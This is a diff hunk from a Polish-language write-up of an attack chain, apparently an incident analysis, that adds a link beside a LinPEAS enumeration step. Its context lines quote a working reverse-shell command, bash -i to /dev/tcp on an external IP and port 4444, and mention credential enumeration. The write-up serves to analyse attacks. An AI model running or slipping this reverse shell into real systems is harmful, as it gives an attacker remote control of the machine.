@@ -275,7 +275,7 @@ To jest ciekawa część. Po ruchomieniu uploadserwera , atakujący grepuje w ps
   - zestawienie reverse shell *bash -i >& /dev/tcp/185.220.101.50/4444 0>&1*
 
 3. Discovery/Enumeration
-  - pobranie i wykorzystanie narzędzia LinPEAS
+  - pobranie i wykorzystanie narzędzia LinPEAS, (podobne do [[lightpeas]])
   - enumerowanie narzędziem usług, userów, procesów, poświadczeń etc.
 
 4. Credential Access 
